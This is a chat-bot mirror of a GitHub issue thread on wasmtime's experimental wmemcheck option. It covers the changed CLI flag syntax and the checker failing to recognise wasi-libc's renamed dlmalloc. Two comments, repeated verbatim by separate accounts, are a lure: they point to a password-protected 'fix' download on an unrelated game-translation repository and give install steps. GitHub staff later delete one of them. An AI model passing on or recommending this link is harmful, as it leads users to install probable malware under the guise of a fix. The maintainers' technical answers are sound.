[
    {
        "content": "<p>trcrsired opened <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181\">issue #9181</a>:</p>\n<blockquote>\n<p>I build wasmtime with this command and still it does not find --wmemcheck why?</p>\n<div class=\"codehilite\" data-code-language=\"Rust\"><pre><span></span><code><span class=\"cp\">$</span><span class=\"w\"> </span><span class=\"n\">cargo</span><span class=\"w\"> </span><span class=\"n\">build</span><span class=\"w\"> </span><span class=\"o\">--</span><span class=\"n\">features</span><span class=\"w\"> </span><span class=\"n\">wmemcheck</span><span class=\"w\"> </span><span class=\"o\">--</span><span class=\"n\">release</span>\n</code></pre></div>\n<p><div class=\"codehilite\" data-code-language=\"Rust\"><pre><span></span><code><span class=\"n\">wasmtime</span><span class=\"w\"> </span><span class=\"n\">run</span><span class=\"w\"> </span><span class=\"o\">--</span><span class=\"n\">wmemcheck</span><span class=\"w\"> </span><span class=\"n\">hello</span>\n<span class=\"n\">error</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nc\">unexpected</span><span class=\"w\"> </span><span class=\"n\">argument</span><span class=\"w\"> </span><span class=\"o\">'--</span><span class=\"n\">wmemcheck</span><span class=\"o\">'</span><span class=\"w\"> </span><span class=\"n\">found</span>\n\n<span class=\"w\">  </span><span class=\"n\">tip</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nc\">to</span><span class=\"w\"> </span><span class=\"n\">pass</span><span class=\"w\"> </span><span class=\"o\">'--</span><span class=\"n\">wmemcheck</span><span class=\"o\">'</span><span class=\"w\"> </span><span class=\"k\">as</span><span class=\"w\"> </span><span class=\"n\">a</span><span class=\"w\"> </span><span class=\"n\">value</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"k\">use</span><span class=\"w\"> </span><span class=\"o\">'--</span><span class=\"w\"> </span><span class=\"o\">--</span><span class=\"n\">wmemcheck</span><span class=\"o\">'</span>\n\n<span class=\"n\">Usage</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nc\">wasmtime</span><span class=\"w\"> </span><span class=\"n\">run</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"n\">OPTIONS</span><span class=\"p\">]</span><span class=\"w\"> </span><span class=\"o\">&lt;</span><span class=\"n\">WASM</span><span class=\"o\">&gt;..</span><span class=\"p\">.</span>\n\n<span class=\"n\">For</span><span class=\"w\"> </span><span class=\"n\">more</span><span class=\"w\"> </span><span class=\"n\">information</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"kr\">try</span><span class=\"w\"> </span><span class=\"o\">'--</span><span class=\"n\">help</span><span class=\"o\">'</span>\n</code></pre></div><br>\n</p>\n</blockquote>",
        "id": 465873731,
        "sender_full_name": "Wasmtime GitHub notifications bot",
        "timestamp": 1724893774
    },
    {
        "content": "<p>louseee <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181#issuecomment-2316529389\">commented</a> on <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181\">issue #9181</a>:</p>\n<blockquote>\n<p>to fix your trouble check this fix, i see it in another issue,<br>\n<a href=\"https://github.com/Jostino/RimWorld-it/releases/tag/fix\">https://github.com/Jostino/RimWorld-it/releases/tag/fix</a><br>\npassword: changeme<br>\nwhen you installing, you need to place a check in install to path and select \"gcc.\"</p>\n</blockquote>",
        "id": 465873838,
        "sender_full_name": "Wasmtime GitHub notifications bot",
        "timestamp": 1724893857
    },
    {
        "content": "<p>64dB0y <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181#issuecomment-2316530006\">commented</a> on <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181\">issue #9181</a>:</p>\n<blockquote>\n<p>to fix your trouble check this fix, i see it in another issue,<br>\n<a href=\"https://github.com/Jostino/RimWorld-it/releases/tag/fix\">https://github.com/Jostino/RimWorld-it/releases/tag/fix</a><br>\npassword: changeme<br>\nwhen you installing, you need to place a check in install to path and select \"gcc.\"</p>\n</blockquote>",
        "id": 465873872,
        "sender_full_name": "Wasmtime GitHub notifications bot",
        "timestamp": 1724893908
    },
    {
        "content": "<p>bjorn3 <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181#issuecomment-2317781181\">commented</a> on <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181\">issue #9181</a>:</p>\n<blockquote>\n<p>You need <code>-W wmemcheck=y</code>/<code>--wasm wmemcheck=y</code>. Looks like the docs didn't get changed when the cli options got changed a while back.</p>\n</blockquote>",
        "id": 466024112,
        "sender_full_name": "Wasmtime GitHub notifications bot",
        "timestamp": 1724940512
    },
    {
        "content": "<p>abrown closed <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181\">issue #9181</a>:</p>\n<blockquote>\n<p>I build wasmtime with this command and still it does not find --wmemcheck why?</p>\n<div class=\"codehilite\" data-code-language=\"Rust\"><pre><span></span><code><span class=\"cp\">$</span><span class=\"w\"> </span><span class=\"n\">cargo</span><span class=\"w\"> </span><span class=\"n\">build</span><span class=\"w\"> </span><span class=\"o\">--</span><span class=\"n\">features</span><span class=\"w\"> </span><span class=\"n\">wmemcheck</span><span class=\"w\"> </span><span class=\"o\">--</span><span class=\"n\">release</span>\n</code></pre></div>\n<p><div class=\"codehilite\" data-code-language=\"Rust\"><pre><span></span><code><span class=\"n\">wasmtime</span><span class=\"w\"> </span><span class=\"n\">run</span><span class=\"w\"> </span><span class=\"o\">--</span><span class=\"n\">wmemcheck</span><span class=\"w\"> </span><span class=\"n\">hello</span>\n<span class=\"n\">error</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nc\">unexpected</span><span class=\"w\"> </span><span class=\"n\">argument</span><span class=\"w\"> </span><span class=\"o\">'--</span><span class=\"n\">wmemcheck</span><span class=\"o\">'</span><span class=\"w\"> </span><span class=\"n\">found</span>\n\n<span class=\"w\">  </span><span class=\"n\">tip</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nc\">to</span><span class=\"w\"> </span><span class=\"n\">pass</span><span class=\"w\"> </span><span class=\"o\">'--</span><span class=\"n\">wmemcheck</span><span class=\"o\">'</span><span class=\"w\"> </span><span class=\"k\">as</span><span class=\"w\"> </span><span class=\"n\">a</span><span class=\"w\"> </span><span class=\"n\">value</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"k\">use</span><span class=\"w\"> </span><span class=\"o\">'--</span><span class=\"w\"> </span><span class=\"o\">--</span><span class=\"n\">wmemcheck</span><span class=\"o\">'</span>\n\n<span class=\"n\">Usage</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nc\">wasmtime</span><span class=\"w\"> </span><span class=\"n\">run</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"n\">OPTIONS</span><span class=\"p\">]</span><span class=\"w\"> </span><span class=\"o\">&lt;</span><span class=\"n\">WASM</span><span class=\"o\">&gt;..</span><span class=\"p\">.</span>\n\n<span class=\"n\">For</span><span class=\"w\"> </span><span class=\"n\">more</span><span class=\"w\"> </span><span class=\"n\">information</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"kr\">try</span><span class=\"w\"> </span><span class=\"o\">'--</span><span class=\"n\">help</span><span class=\"o\">'</span>\n</code></pre></div><br>\n</p>\n</blockquote>",
        "id": 466054877,
        "sender_full_name": "Wasmtime GitHub notifications bot",
        "timestamp": 1724947268
    },
    {
        "content": "<p>trcrsired <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181#issuecomment-2319084362\">commented</a> on <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181\">issue #9181</a>:</p>\n<blockquote>\n<blockquote>\n<p>You need <code>-W wmemcheck=y</code>/<code>--wasm wmemcheck=y</code>. Looks like the docs didn't get changed when the cli options got changed a while back.</p>\n</blockquote>\n<div class=\"codehilite\" data-code-language=\"Rust\"><pre><span></span><code><span class=\"p\">#</span><span class=\"n\">include</span><span class=\"o\">&lt;</span><span class=\"n\">fcntl</span><span class=\"p\">.</span><span class=\"n\">h</span><span class=\"o\">&gt;</span>\n<span class=\"p\">#</span><span class=\"n\">include</span><span class=\"o\">&lt;</span><span class=\"n\">unistd</span><span class=\"p\">.</span><span class=\"n\">h</span><span class=\"o\">&gt;</span>\n\n<span class=\"n\">int</span><span class=\"w\"> </span><span class=\"n\">main</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n<span class=\"w\"> </span><span class=\"n\">int</span><span class=\"w\"> </span><span class=\"n\">fd</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">open</span><span class=\"p\">(</span><span class=\"s\">\"example.txt\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">O_RDWR</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">O_CREAT</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">S_IRUSR</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">S_IWUSR</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</code></pre></div>\n<div class=\"codehilite\" data-code-language=\"Rust\"><pre><span></span><code><span class=\"cp\">$</span><span class=\"w\"> </span><span class=\"n\">wasmtime</span><span class=\"w\"> </span><span class=\"o\">--</span><span class=\"n\">wasm</span><span class=\"w\"> </span><span class=\"n\">wmemcheck</span><span class=\"o\">=</span><span class=\"n\">y</span><span class=\"w\"> </span><span class=\"o\">--</span><span class=\"n\">dir</span><span class=\"w\"> </span><span class=\"p\">.</span><span class=\"w\"> </span><span class=\"p\">.</span><span class=\"o\">/</span><span class=\"n\">test</span><span class=\"p\">.</span><span class=\"n\">wasm</span>\n<span class=\"n\">Error</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nc\">failed</span><span class=\"w\"> </span><span class=\"n\">to</span><span class=\"w\"> </span><span class=\"n\">run</span><span class=\"w\"> </span><span class=\"n\">main</span><span class=\"w\"> </span><span class=\"n\">module</span><span class=\"w\"> </span><span class=\"err\">`</span><span class=\"p\">.</span><span class=\"o\">/</span><span class=\"n\">test</span><span class=\"p\">.</span><span class=\"n\">wasm</span><span class=\"err\">`</span>\n\n<span class=\"n\">Caused</span><span class=\"w\"> </span><span class=\"n\">by</span><span class=\"p\">:</span>\n<span class=\"w\">    </span><span class=\"mi\">0</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nc\">failed</span><span class=\"w\"> </span><span class=\"n\">to</span><span class=\"w\"> </span><span class=\"n\">invoke</span><span class=\"w\"> </span><span class=\"n\">command</span><span class=\"w\"> </span><span class=\"n\">default</span>\n<span class=\"w\">    </span><span class=\"mi\">1</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nc\">error</span><span class=\"w\"> </span><span class=\"k\">while</span><span class=\"w\"> </span><span class=\"n\">executing</span><span class=\"w\"> </span><span class=\"n\">at</span><span class=\"w\"> </span><span class=\"n\">wasm</span><span class=\"w\"> </span><span class=\"n\">backtrace</span><span class=\"p\">:</span>\n<span class=\"w\">           </span><span class=\"mi\">0</span><span class=\"p\">:</span><span class=\"w\">  </span><span class=\"mh\">0xb3e</span><span class=\"w\"> </span><span class=\"o\">-</span><span class=\"w\"> </span><span class=\"n\">test</span><span class=\"p\">.</span><span class=\"n\">wasm</span><span class=\"o\">!</span><span class=\"n\">dlmalloc</span>\n<span class=\"w\">           </span><span class=\"mi\">1</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mh\">0x232b</span><span class=\"w\"> </span><span class=\"o\">-</span><span class=\"w\"> </span><span class=\"n\">test</span><span class=\"p\">.</span><span class=\"n\">wasm</span><span class=\"o\">!</span><span class=\"n\">calloc</span>\n<span class=\"w\">           </span><span class=\"mi\">2</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mh\">0x2537</span><span class=\"w\"> </span><span class=\"o\">-</span><span class=\"w\"> </span><span class=\"n\">test</span><span class=\"p\">.</span><span class=\"n\">wasm</span><span class=\"o\">!</span><span class=\"n\">internal_register_preopened_fd_unlocked</span>\n<span class=\"w\">           </span><span class=\"mi\">3</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mh\">0x24ac</span><span class=\"w\"> </span><span class=\"o\">-</span><span class=\"w\"> </span><span class=\"n\">test</span><span class=\"p\">.</span><span class=\"n\">wasm</span><span class=\"o\">!</span><span class=\"n\">__wasilibc_populate_preopens</span>\n<span class=\"w\">           </span><span class=\"mi\">4</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mh\">0x266d</span><span class=\"w\"> </span><span class=\"o\">-</span><span class=\"w\"> </span><span class=\"n\">test</span><span class=\"p\">.</span><span class=\"n\">wasm</span><span class=\"o\">!</span><span class=\"n\">__wasilibc_find_abspath</span>\n<span class=\"w\">           </span><span class=\"mi\">5</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mh\">0x264a</span><span class=\"w\"> </span><span class=\"o\">-</span><span class=\"w\"> </span><span class=\"n\">test</span><span class=\"p\">.</span><span class=\"n\">wasm</span><span class=\"o\">!</span><span class=\"n\">__wasilibc_find_relpath</span>\n<span class=\"w\">           </span><span class=\"mi\">6</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mh\">0x23ae</span><span class=\"w\"> </span><span class=\"o\">-</span><span class=\"w\"> </span><span class=\"n\">test</span><span class=\"p\">.</span><span class=\"n\">wasm</span><span class=\"o\">!</span><span class=\"n\">open</span>\n<span class=\"w\">           </span><span class=\"mi\">7</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mh\">0x2f09</span><span class=\"w\"> </span><span class=\"o\">-</span><span class=\"w\"> </span><span class=\"n\">test</span><span class=\"p\">.</span><span class=\"n\">wasm</span><span class=\"o\">!</span><span class=\"n\">__main_void</span>\n<span class=\"w\">           </span><span class=\"mi\">8</span><span class=\"p\">:</span><span class=\"w\">  </span><span class=\"mh\">0x1a7</span><span class=\"w\"> </span><span class=\"o\">-</span><span class=\"w\"> </span><span class=\"n\">test</span><span class=\"p\">.</span><span class=\"n\">wasm</span><span class=\"o\">!</span><span class=\"n\">_start</span>\n<span class=\"w\">    </span><span class=\"mi\">2</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nc\">Invalid</span><span class=\"w\"> </span><span class=\"n\">store</span><span class=\"w\"> </span><span class=\"n\">at</span><span class=\"w\"> </span><span class=\"n\">addr</span><span class=\"w\"> </span><span class=\"mh\">0x1066c</span><span class=\"w\"> </span><span class=\"n\">of</span><span class=\"w\"> </span><span class=\"n\">size</span><span class=\"w\"> </span><span class=\"mi\">4</span>\n</code></pre></div>\n<p>calloc does not work right?<br>\n</p>\n</blockquote>",
        "id": 466117664,
        "sender_full_name": "Wasmtime GitHub notifications bot",
        "timestamp": 1724967970
    },
    {
        "content": "<p>cfallin <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181#issuecomment-2319149492\">commented</a> on <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181\">issue #9181</a>:</p>\n<blockquote>\n<p>It looks like wmemcheck's heuristic for finding <code>malloc</code> and avoiding instrumenting stores within the malloc implementation itself is no longer valid -- <a href=\"https://github.com/bytecodealliance/wasmtime/blob/a6048e542590755db2715311680fed09e1107b65/crates/cranelift/src/func_environ.rs#L2625-L2632\">here</a> the implementation looks for functions named <code>malloc</code> and <code>free</code>, but at some point wasi-libc must have renamed <code>malloc</code> to <code>dlmalloc</code>.</p>\n<p>You're welcome to submit a PR to accept both options. Note that <code>wmemcheck</code> is described in the documentation as experimental and unfinished -- we had an intern build it last year and it was an excellent start but it needs a little more polish before we mark the option as \"polished\" and included in default builds. For example (to save you the trouble of filing another bug report!), it also doesn't support <code>realloc</code> currently.</p>\n</blockquote>",
        "id": 466121483,
        "sender_full_name": "Wasmtime GitHub notifications bot",
        "timestamp": 1724969963
    },
    {
        "content": "<p>trcrsired <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181#issuecomment-2319155481\">commented</a> on <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181\">issue #9181</a>:</p>\n<blockquote>\n<blockquote>\n<p>It looks like wmemcheck's heuristic for finding <code>malloc</code> and avoiding instrumenting stores within the malloc implementation itself is no longer valid -- <a href=\"https://github.com/bytecodealliance/wasmtime/blob/a6048e542590755db2715311680fed09e1107b65/crates/cranelift/src/func_environ.rs#L2625-L2632\">here</a> the implementation looks for functions named <code>malloc</code> and <code>free</code>, but at some point wasi-libc must have renamed <code>malloc</code> to <code>dlmalloc</code>.</p>\n<p>You're welcome to submit a PR to accept both options. Note that <code>wmemcheck</code> is described in the documentation as experimental and unfinished -- we had an intern build it last year and it was an excellent start but it needs a little more polish before we mark the option as \"polished\" and included in default builds. For example (to save you the trouble of filing another bug report!), it also doesn't support <code>realloc</code> currently.</p>\n</blockquote>\n<p>So the implementation is still ongoing and far from usable at this point right? And if the symbols got stripped, it cannot detect issues either right since now the wasmtime cannot find malloc and calloc</p>\n</blockquote>",
        "id": 466121907,
        "sender_full_name": "Wasmtime GitHub notifications bot",
        "timestamp": 1724970155
    },
    {
        "content": "<p>cfallin <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181#issuecomment-2319161360\">commented</a> on <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181\">issue #9181</a>:</p>\n<blockquote>\n<p>That's correct.</p>\n</blockquote>",
        "id": 466122266,
        "sender_full_name": "Wasmtime GitHub notifications bot",
        "timestamp": 1724970367
    },
    {
        "content": "<p>github-staff deleted a <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181#issuecomment-2316529389\">comment</a> on <a href=\"https://github.com/bytecodealliance/wasmtime/issues/9181\">issue #9181</a>:</p>\n<blockquote>\n<p>to fix your trouble check this fix, i see it in another issue,<br>\n<a href=\"https://github.com/Jostino/RimWorld-it/releases/tag/fix\">https://github.com/Jostino/RimWorld-it/releases/tag/fix</a><br>\npassword: changeme<br>\nwhen you installing, you need to place a check in install to path and select \"gcc.\"</p>\n</blockquote>",
        "id": 475266266,
        "sender_full_name": "Wasmtime GitHub notifications bot",
        "timestamp": 1728296994
    }
]